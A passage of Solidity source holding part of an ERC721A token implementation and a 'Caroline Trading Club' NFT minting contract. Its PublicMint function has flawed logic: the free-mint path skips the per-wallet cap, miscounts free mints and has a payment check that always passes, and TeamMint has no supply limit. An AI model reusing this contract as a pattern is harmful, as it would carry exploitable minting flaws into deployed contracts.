1040      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
1041      * by default, can be overriden in child contracts.
1042      */
1043     function _baseURI() internal view virtual returns (string memory) {
1044         return "";
1045     }
1046 
1047     /**
1048      * @dev See {IERC721-approve}.
1049      */
1050     function approve(address to, uint256 tokenId) public override {
1051         address owner = ERC721A.ownerOf(tokenId);
1052         require(to != owner, "ERC721A: approval to current owner");
1053 
1054         require(
1055             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
1056             "ERC721A: approve caller is not owner nor approved for all"
1057         );
1058 
1059         _approve(to, tokenId, owner);
1060     }
1061 
1062     /**
1063      * @dev See {IERC721-getApproved}.
1064      */
1065     function getApproved(uint256 tokenId) public view override returns (address) {
1066         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
1067 
1068         return _tokenApprovals[tokenId];
1069     }
1070 
1071     /**
1072      * @dev See {IERC721-setApprovalForAll}.
1073      */
1074     function setApprovalForAll(address operator, bool approved) public override {
1075         require(operator != _msgSender(), "ERC721A: approve to caller");
1076 
1077         _operatorApprovals[_msgSender()][operator] = approved;
1078         emit ApprovalForAll(_msgSender(), operator, approved);
1079     }
1080 
1081     /**
1082      * @dev See {IERC721-isApprovedForAll}.
1083      */
1084     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1085         return _operatorApprovals[owner][operator];
1086     }
1087 
1088     /**
1089      * @dev See {IERC721-transferFrom}.
1090      */
1091     function transferFrom(
1092         address from,
1093         address to,
1094         uint256 tokenId
1095     ) public virtual override {
1096         _transfer(from, to, tokenId);
1097     }
1098 
1099     /**
1100      * @dev See {IERC721-safeTransferFrom}.
1101      */
1102     function safeTransferFrom(
1103         address from,
1104         address to,
1105         uint256 tokenId
1106     ) public virtual override {
1107         safeTransferFrom(from, to, tokenId, "");
1108     }
1109 
1110     /**
1111      * @dev See {IERC721-safeTransferFrom}.
1112      */
1113     function safeTransferFrom(
1114         address from,
1115         address to,
1116         uint256 tokenId,
1117         bytes memory _data
1118     ) public override {
1119         _transfer(from, to, tokenId);
1120         require(
1121             _checkOnERC721Received(from, to, tokenId, _data),
1122             "ERC721A: transfer to non ERC721Receiver implementer"
1123         );
1124     }
1125 
1126     /**
1127      * @dev Returns whether `tokenId` exists.
1128      *
1129      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1130      *
1131      * Tokens start existing when they are minted (`_mint`),
1132      */
1133     function _exists(uint256 tokenId) internal view returns (bool) {
1134         return tokenId < currentIndex;
1135     }
1136 
1137     function _safeMint(address to, uint256 quantity) internal {
1138         _safeMint(to, quantity, "");
1139     }
1140 
1141     /**
1142      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1143      *
1144      * Requirements:
1145      *
1146      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1147      * - `quantity` must be greater than 0.
1148      *
1149      * Emits a {Transfer} event.
1150      */
1151     function _safeMint(
1152         address to,
1153         uint256 quantity,
1154         bytes memory _data
1155     ) internal {
1156         _mint(to, quantity, _data, true);
1157     }
1158 
1159     /**
1160      * @dev Mints `quantity` tokens and transfers them to `to`.
1161      *
1162      * Requirements:
1163      *
1164      * - `to` cannot be the zero address.
1165      * - `quantity` must be greater than 0.
1166      *
1167      * Emits a {Transfer} event.
1168      */
1169     function _mint(
1170         address to,
1171         uint256 quantity,
1172         bytes memory _data,
1173         bool safe
1174     ) internal {
1175         uint256 startTokenId = currentIndex;
1176         require(to != address(0), "ERC721A: mint to the zero address");
1177         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1178 
1179         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1180 
1181         // Overflows are incredibly unrealistic.
1182         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1183         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1184         unchecked {
1185             _addressData[to].balance += uint128(quantity);
1186             _addressData[to].numberMinted += uint128(quantity);
1187 
1188             _ownerships[startTokenId].addr = to;
1189             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1190 
1191             uint256 updatedIndex = startTokenId;
1192 
1193             for (uint256 i; i < quantity; i++) {
1194                 emit Transfer(address(0), to, updatedIndex);
1195                 if (safe) {
1196                     require(
1197                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1198                         "ERC721A: transfer to non ERC721Receiver implementer"
1199                     );
1200                 }
1201 
1202                 updatedIndex++;
1203             }
1204 
1205             currentIndex = updatedIndex;
1206         }
1207 
1208         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1209     }
1210 
1211     /**
1212      * @dev Transfers `tokenId` from `from` to `to`.
1213      *
1214      * Requirements:
1215      *
1216      * - `to` cannot be the zero address.
1217      * - `tokenId` token must be owned by `from`.
1218      *
1219      * Emits a {Transfer} event.
1220      */
1221     function _transfer(
1222         address from,
1223         address to,
1224         uint256 tokenId
1225     ) private {
1226         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1227 
1228         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1229             getApproved(tokenId) == _msgSender() ||
1230             isApprovedForAll(prevOwnership.addr, _msgSender()));
1231 
1232         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1233 
1234         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1235         require(to != address(0), "ERC721A: transfer to the zero address");
1236 
1237         _beforeTokenTransfers(from, to, tokenId, 1);
1238 
1239         // Clear approvals from the previous owner
1240         _approve(address(0), tokenId, prevOwnership.addr);
1241 
1242         // Underflow of the sender's balance is impossible because we check for
1243         // ownership above and the recipient's balance can't realistically overflow.
1244         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1245         unchecked {
1246             _addressData[from].balance -= 1;
1247             _addressData[to].balance += 1;
1248 
1249             _ownerships[tokenId].addr = to;
1250             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1251 
1252             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1253             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1254             uint256 nextTokenId = tokenId + 1;
1255             if (_ownerships[nextTokenId].addr == address(0)) {
1256                 if (_exists(nextTokenId)) {
1257                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1258                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1259                 }
1260             }
1261         }
1262 
1263         emit Transfer(from, to, tokenId);
1264         _afterTokenTransfers(from, to, tokenId, 1);
1265     }
1266 
1267     /**
1268      * @dev Approve `to` to operate on `tokenId`
1269      *
1270      * Emits a {Approval} event.
1271      */
1272     function _approve(
1273         address to,
1274         uint256 tokenId,
1275         address owner
1276     ) private {
1277         _tokenApprovals[tokenId] = to;
1278         emit Approval(owner, to, tokenId);
1279     }
1280 
1281     /**
1282      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1283      * The call is not executed if the target address is not a contract.
1284      *
1285      * @param from address representing the previous owner of the given token ID
1286      * @param to target address that will receive the tokens
1287      * @param tokenId uint256 ID of the token to be transferred
1288      * @param _data bytes optional data to send along with the call
1289      * @return bool whether the call correctly returned the expected magic value
1290      */
1291     function _checkOnERC721Received(
1292         address from,
1293         address to,
1294         uint256 tokenId,
1295         bytes memory _data
1296     ) private returns (bool) {
1297         if (to.isContract()) {
1298             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1299                 return retval == IERC721Receiver(to).onERC721Received.selector;
1300             } catch (bytes memory reason) {
1301                 if (reason.length == 0) {
1302                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1303                 } else {
1304                     assembly {
1305                         revert(add(32, reason), mload(reason))
1306                     }
1307                 }
1308             }
1309         } else {
1310             return true;
1311         }
1312     }
1313 
1314     /**
1315      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1316      *
1317      * startTokenId - the first token id to be transferred
1318      * quantity - the amount to be transferred
1319      *
1320      * Calling conditions:
1321      *
1322      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1323      * transferred to `to`.
1324      * - When `from` is zero, `tokenId` will be minted for `to`.
1325      */
1326     function _beforeTokenTransfers(
1327         address from,
1328         address to,
1329         uint256 startTokenId,
1330         uint256 quantity
1331     ) internal virtual {}
1332 
1333     /**
1334      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1335      * minting.
1336      *
1337      * startTokenId - the first token id to be transferred
1338      * quantity - the amount to be transferred
1339      *
1340      * Calling conditions:
1341      *
1342      * - when `from` and `to` are both non-zero.
1343      * - `from` and `to` are never both zero.
1344      */
1345     function _afterTokenTransfers(
1346         address from,
1347         address to,
1348         uint256 startTokenId,
1349         uint256 quantity
1350     ) internal virtual {}
1351 }
1352 
1353 contract CarolineTradingClub is ERC721A, Ownable, ReentrancyGuard {
1354     string public baseURI = "ipfs:///";
1355     uint   public price             = 0.001 ether;
1356     uint   public maxPerTx          = 10;
1357     uint   public maxPerFree        = 10;
1358     uint   public maxPerWallet      = 50;
1359     uint   public totalFree         = 5000;
1360     uint   public maxSupply         = 8000;
1361     bool   public mintEnabled;
1362     uint   public totalFreeMinted = 0;
1363 
1364     mapping(address => uint256) public _mintedFreeAmount;
1365     mapping(address => uint256) public _totalMintedAmount;
1366 
1367     constructor() ERC721A("Caroline Trading Club", "CTC"){}
1368 
1369     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1370         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1371         string memory currentBaseURI = _baseURI();
1372         return bytes(currentBaseURI).length > 0
1373             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId),".json"))
1374             : "";
1375     }
1376     
1377 
1378     function _startTokenId() internal view virtual returns (uint256) {
1379         return 0;
1380     }
1381 
1382     function PublicMint(uint256 count) external payable {
1383         uint256 cost = price;
1384         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1385             (_mintedFreeAmount[msg.sender] < maxPerFree));
1386 
1387         if (isFree) { 
1388             require(mintEnabled, "Mint is not live yet");
1389             require(totalSupply() + count <= maxSupply, "No more");
1390             require(count <= maxPerTx, "Max per TX reached.");
1391             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1392             {
1393              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1394              _mintedFreeAmount[msg.sender] = maxPerFree;
1395              totalFreeMinted += maxPerFree;
1396             }
1397             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1398             {
1399              require(msg.value >= 0, "Please send the exact ETH amount");
1400              _mintedFreeAmount[msg.sender] += count;
1401              totalFreeMinted += count;
1402             }
1403         }
1404         else{
1405         require(mintEnabled, "Mint is not live yet");
1406         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1407         require(msg.value >= count * cost, "Please send the exact ETH amount");
1408         require(totalSupply() + count <= maxSupply, "No more");
1409         require(count <= maxPerTx, "Max per TX reached.");
1410         require(msg.sender == tx.origin, "The minter is another contract");
1411         }
1412         _totalMintedAmount[msg.sender] += count;
1413         _safeMint(msg.sender, count);
1414     }
1415 
1416     function costCheck() public view returns (uint256) {
1417         return price;
1418     }
1419 
1420     function maxFreePerWallet() public view returns (uint256) {
1421       return maxPerFree;
1422     }
1423 
1424     function _baseURI() internal view virtual override returns (string memory) {
1425         return baseURI;
1426     }
1427 
1428     function setBaseUri(string memory baseuri_) public onlyOwner {
1429         baseURI = baseuri_;
1430     }
1431 
1432     function setPrice(uint256 price_) external onlyOwner {
1433         price = price_;
1434     }
1435 
1436     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1437         totalFree = MaxTotalFree_;
1438     }
1439 
1440      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1441         maxPerFree = MaxPerFree_;
1442     }
1443 
1444     function live() external onlyOwner {
1445       mintEnabled = !mintEnabled;
1446     }
1447     
1448    function TeamMint(uint256 quantity) external onlyOwner {
1449         _safeMint(_msgSender(), quantity);
1450     }
1451 
1452     function withdraw() external onlyOwner nonReentrant {
1453         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1454         require(success, "Transfer failed.");
1455     }
1456 }